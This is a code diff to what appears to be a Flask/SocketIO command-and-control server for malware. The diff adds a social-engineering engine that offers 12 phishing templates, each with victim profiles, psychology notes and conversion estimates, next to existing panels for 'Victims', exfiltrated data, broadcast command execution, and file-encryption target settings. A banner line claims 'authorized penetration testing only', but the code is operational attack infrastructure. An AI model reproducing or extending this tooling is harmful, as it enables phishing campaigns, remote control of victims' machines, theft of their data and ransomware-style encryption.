@@ -9,6 +9,7 @@ Flask + SocketIO real-time WebSocket-based C2 with:
 - Exfiltrated data viewer
 - DGA domain pre-registration
 - Built-in payload builder via web UI
+- **Multi-Template Social Engineering Engine (12 delivery templates)**
 """
 
 import os, sys, json, time, uuid, ssl, sqlite3, base64, hashlib
@@ -25,6 +26,29 @@ try:
 except ImportError:
     print("[!] Install: pip install flask flask-socketio eventlet cryptography")
     sys.exit(1)
+
+# ================================================================
+# SET BUILDER v5 INTEGRATION
+# ================================================================
+try:
+    from set_builder_v5 import create_builder, get_c2_routes, BUILDER_DASHBOARD_HTML, TEMPLATE_REGISTRY
+    BUILDER_AVAILABLE = True
+    print("[+] SET Builder v5 loaded (12 social-engineering templates)")
+except ImportError as e:
+    print(f"[!] SET Builder v5 not available: {e}")
+    print("[!] Run: pip install set_builder_v5 or place set_builder_v5.py in same directory")
+    BUILDER_AVAILABLE = False
+    # Create dummy to avoid crashes
+    def create_builder():
+        return None
+    def get_c2_routes(b):
+        from flask import Blueprint
+        bp = Blueprint("builder", __name__, url_prefix="/api/builder")
+        @bp.route("/templates")
+        def no_builder():
+            return jsonify({"error": "Builder not installed"})
+        return bp
+    TEMPLATE_REGISTRY = {}
 
 # ================================================================
 # DATABASE SETUP
@@ -219,7 +243,14 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 connected_victims: Dict[str, Dict] = {}  # sid -> victim_info
 
 # ================================================================
-# WEB UI - EMBEDDED
+# INIT BUILDER & REGISTER ROUTES
+# ================================================================
+builder = create_builder()
+builder_bp = get_c2_routes(builder)
+app.register_blueprint(builder_bp)
+
+# ================================================================
+# WEB UI - EMBEDDED (with Builder Dashboard link in sidebar)
 # ================================================================
 
 INDEX_HTML = """<!DOCTYPE html>
@@ -316,7 +347,8 @@ tbody tr:hover{background:var(--primary-dim);}
 <nav>
 <a href="#" class="active" data-page="dashboard">&#9783; Dashboard</a>
 <a href="#" data-page="victims">&#127919; Victims</a>
-<a href="#" data-page="builder">&#128230; Builder</a>
+<a href="#" data-page="builder">&#128295; Builder</a>
+<a href="/builder" data-page="templates" target="_blank">&#127912; Templates (NEW)</a>
 <a href="#" data-page="exfil">&#128230; Exfil Data</a>
 <a href="#" data-page="config">&#9881; Config</a>
 </nav>
@@ -401,6 +433,11 @@ tbody tr:hover{background:var(--primary-dim);}
 </select>
 </div>
 <button class="btn btn-danger" onclick="broadcastCmd()">&#128640; Execute</button>
+</div>
+<div class="card" style="grid-column: 1 / -1;">
+<h3 class="mb">&#127912; Social Engineering Templates</h3>
+<p class="t-sm t-dim mb">Choose from 12 pre-built phishing templates or build your own using the <a href="/builder" target="_blank" style="color:var(--primary);">Template Builder</a>.</p>
+<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;" id="templateList"></div>
 </div>
 </div>
 </div>
@@ -506,6 +543,7 @@ socket.on('initial_state', (d)=>{
 // Page nav
 document.querySelectorAll('.sidebar nav a').forEach(a=>{
   a.addEventListener('click', (e)=>{
+    if(a.getAttribute('target')==='_blank') return; // external link
     e.preventDefault();
     document.querySelectorAll('.sidebar nav a').forEach(x=>x.classList.remove('active'));
     a.classList.add('active');
@@ -515,6 +553,7 @@ document.querySelectorAll('.sidebar nav a').forEach(a=>{
     document.getElementById('pageTitle').textContent = a.textContent.trim();
     if(page==='config') loadConfig();
     if(page==='exfil') loadExfil();
+    if(page==='builder') loadTemplates();
   });
 });
 
@@ -533,6 +572,18 @@ document.querySelectorAll('.tabs button').forEach(b=>{
 document.getElementById('vCmd').addEventListener('change', function(){
   document.getElementById('vExecExtra').classList.toggle('hidden', this.value!=='exec');
 });
+
+function loadTemplates(){
+  fetch('/api/builder/templates').then(r=>r.json()).then(templates=>{
+    if(templates.error) return;
+    const list = document.getElementById('templateList');
+    list.innerHTML = templates.map(t => 
+      `<a href="/builder?template=${t.id}" target="_blank" style="display:block;padding:8px 12px;background:var(--bg3);border-radius:var(--radius);color:var(--text);text-decoration:none;font-size:11px;border:1px solid transparent;transition:.15s;" onmouseover="this.style.borderColor='var(--primary)'" onmouseout="this.style.borderColor='transparent'">
+        <strong>${t.name}</strong><br><span style="font-size:9px;color:var(--text-dim);">${t.category} · Conv: ${t.conversion_estimate}</span>
+      </a>`
+    ).join('');
+  }).catch(()=>{});
+}
 
 function updateAll(){
   updateTable(); updateStats(); updateSidebar(); updateBcSelect();
@@ -729,6 +780,9 @@ function loadExfil(){
     </tr>`).join('');
   });
 }
+
+// Load templates on builder page enter
+document.addEventListener('DOMContentLoaded', ()=>{ loadTemplates(); });
 </script>
 </body></html>
 """
@@ -858,6 +912,51 @@ def api_set_targets():
     set_config("encrypt_extensions", json.dumps(data.get("encrypt_extensions", [])))
     set_config("target_dirs", json.dumps(data.get("target_dirs", [])))
     return jsonify({"success": True})
+
+# ================================================================
+# BUILDER DASHBOARD ROUTE (Full multi-template dashboard)
+# ================================================================
+
+@app.route("/builder")
+def builder_dashboard():
+    """Render the full multi-template builder dashboard."""
+    if not BUILDER_AVAILABLE:
+        return '<html><body><h1>SET Builder v5 not installed</h1><p>Place set_builder_v5.py in the same directory and restart.</p></body></html>'
+    
+    # Build the template data JSON with all metadata
+    templates_data = []
+    for tid, t in TEMPLATE_REGISTRY.items():
+        templates_data.append({
+            "id": tid,
+            "name": t["name"],
+            "category": t["category"],
+            "description": t["description"],
+            "victim_profile": t["victim_profile"][:100],
+            "psychology": t["psychology"][:100],
+            "delivery_method": t["delivery_method"],
+            "difficulty": t["difficulty"],
+            "risk_detection": t["risk_detection"],
+            "conversion_estimate": t["conversion_estimate"],
+            "brand_colors": t["brand_colors"],
+        })
+    
+    templates_json = json.dumps(templates_data)
+    
+    # Inject template data into the BUILDER_DASHBOARD_HTML
+    html = BUILDER_DASHBOARD_HTML
+    # Replace the empty template data with our JSON
+    html = html.replace(
+        '<script id="__TEMPLATE_DATA__" type="application/json">[]</script>',
+        f'<script id="__TEMPLATE_DATA__" type="application/json">{templates_json}</script>'
+    )
+    # Also set the window variable fallback
+    html = html.replace(
+        "document.getElementById('__TEMPLATE_DATA__')?.textContent || '[]'",
+        templates_json
+    )
+    
+    return render_template_string(html)
+
 
 # ================================================================
 # SOCKET.IO EVENTS
@@ -1028,6 +1127,8 @@ if __name__ == "__main__":
 ║                                                              ║
 ║  [+] Dashboard: http{'s' if use_ssl else ''}://0.0.0.0:{port}             ║
 ║  [+] WebSocket: ws{'s' if use_ssl else ''}://0.0.0.0:{port}                 ║
+║  [+] Builder:   http{'s' if use_ssl else ''}://0.0.0.0:{port}/builder     ║
+║  [+] Templates: 12 social engineering templates loaded      ║
 ║  [+] DB: {DB_PATH.name}                                       ║
 ║                                                              ║
 ║  WARNING: Authorized penetration testing only.              ║
